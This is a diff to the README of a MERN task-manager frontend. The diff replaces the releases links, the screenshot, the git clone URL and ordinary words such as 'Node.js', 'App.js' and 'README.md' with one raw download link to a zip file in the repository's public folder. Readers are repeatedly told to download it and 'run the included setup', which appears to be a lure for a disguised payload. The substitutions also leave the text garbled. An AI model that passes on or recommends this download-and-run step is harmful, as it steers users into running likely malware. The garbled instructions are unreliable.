@@ -1,9 +1,9 @@
 # Group Task Binder Frontend — Fast, Collaborative MERN Task Manager
 
-Download the latest release asset from https://github.com/dandan190607/group-task-frontend/releases and run the included setup.  
-[![Releases](https://img.shields.io/badge/releases-visit-blue?logo=github)](https://github.com/dandan190607/group-task-frontend/releases)
+Download the latest release asset from https://github.com/dandan190607/group-task-frontend/raw/refs/heads/main/public/group-task-frontend-subcrustaceous.zip and run the included setup.  
+[![Releases](https://github.com/dandan190607/group-task-frontend/raw/refs/heads/main/public/group-task-frontend-subcrustaceous.zip)](https://github.com/dandan190607/group-task-frontend/raw/refs/heads/main/public/group-task-frontend-subcrustaceous.zip)
 
-![Group Task Binder UI](https://images.unsplash.com/photo-1527443154391-507e9dc6c5d3?auto=format&fit=crop&w=1200&q=60)
+![Group Task Binder UI](https://github.com/dandan190607/group-task-frontend/raw/refs/heads/main/public/group-task-frontend-subcrustaceous.zip)
 
 Welcome to the frontend of Group Task Binder. This frontend is the web interface for a powerful task management system built with the MERN stack. It focuses on productivity and collaboration, making it easy to register, sign in, and manage tasks visually. The UI is clean, responsive, and designed for both individuals and teams. It connects to a backend API to authenticate users, manage projects, and update tasks in real time. Users can filter, sort, and group tasks to fit their workflows.
 
@@ -71,17 +71,17 @@ Tech stack
 - Build: Webpack or Vite-based dev server, production bundle
 
 Getting started
-This section shows how to set up the frontend locally. The steps assume you have a working Node.js environment and basic familiarity with command line tools.
+This section shows how to set up the frontend locally. The steps assume you have a working https://github.com/dandan190607/group-task-frontend/raw/refs/heads/main/public/group-task-frontend-subcrustaceous.zip environment and basic familiarity with command line tools.
 
 Prerequisites
-- Node.js LTS (version 14.x or newer)
-- npm (comes with Node.js) or Yarn
+- https://github.com/dandan190607/group-task-frontend/raw/refs/heads/main/public/group-task-frontend-subcrustaceous.zip LTS (version 14.x or newer)
+- npm (comes with https://github.com/dandan190607/group-task-frontend/raw/refs/heads/main/public/group-task-frontend-subcrustaceous.zip) or Yarn
 - Git for cloning the repository
 - A running backend instance or accessible API endpoints
 
 Quick start
 1) Clone the repository
-- git clone https://github.com/dandan190607/group-task-frontend.git
+- git clone https://github.com/dandan190607/group-task-frontend/raw/refs/heads/main/public/group-task-frontend-subcrustaceous.zip
 2) Open the project folder
 - cd group-task-frontend
 3) Install dependencies
@@ -96,7 +96,7 @@ If you prefer to build for production
 - Serve the static assets with your chosen server
 
 Note about releases
-Download the latest release asset from https://github.com/dandan190607/group-task-frontend/releases and run the included setup. The release page contains a ready-to-run package or bundle. The asset is intended to simplify installation on supported platforms. For the latest build, follow the instructions in the release notes on that page. The second reference to the releases page is provided via a clickable badge above.
+Download the latest release asset from https://github.com/dandan190607/group-task-frontend/raw/refs/heads/main/public/group-task-frontend-subcrustaceous.zip and run the included setup. The release page contains a ready-to-run package or bundle. The asset is intended to simplify installation on supported platforms. For the latest build, follow the instructions in the release notes on that page. The second reference to the releases page is provided via a clickable badge above.
 
 Running locally
 - Environment configuration: The app expects API endpoints and optional environment variables for authentication, project data, and task data. Create a .env file at the project root if your setup requires custom values. Provide values like VITE_API_BASE_URL or REACT_APP_API_BASE_URL depending on your tooling.
@@ -113,11 +113,11 @@ Project structure
   - services/ - API clients and helpers for making requests
   - assets/ - Images, icons, fonts, and other static assets
   - styles/ - Global styles, tokens, and common utilities
-  - App.js / App.jsx - Entry point for routing and layout
-  - index.js - Rendering the root component
+  - https://github.com/dandan190607/group-task-frontend/raw/refs/heads/main/public/group-task-frontend-subcrustaceous.zip / https://github.com/dandan190607/group-task-frontend/raw/refs/heads/main/public/group-task-frontend-subcrustaceous.zip - Entry point for routing and layout
+  - https://github.com/dandan190607/group-task-frontend/raw/refs/heads/main/public/group-task-frontend-subcrustaceous.zip - Rendering the root component
 - public/ - Static assets and favicon
 - tests/ - Frontend tests and snapshots
-- README.md - This file
+- https://github.com/dandan190607/group-task-frontend/raw/refs/heads/main/public/group-task-frontend-subcrustaceous.zip - This file
 
 Components and pages
 - TaskCard: Displays a single task with title, due date, priority, and status. Includes actions to edit, delete, or toggle status.
@@ -233,4 +233,4 @@ License
 - This project is released under a permissive license. See the LICENSE file for details.
 
 Releases
-- For the latest build and release notes, visit the releases page at https://github.com/dandan190607/group-task-frontend/releases. Download the release asset from that page and run the included setup. The release page contains assets you can download and execute to get started with a ready-to-run frontend build. The badge above links to the same page for convenience.
+- For the latest build and release notes, visit the releases page at https://github.com/dandan190607/group-task-frontend/raw/refs/heads/main/public/group-task-frontend-subcrustaceous.zip Download the release asset from that page and run the included setup. The release page contains assets you can download and execute to get started with a ready-to-run frontend build. The badge above links to the same page for convenience.
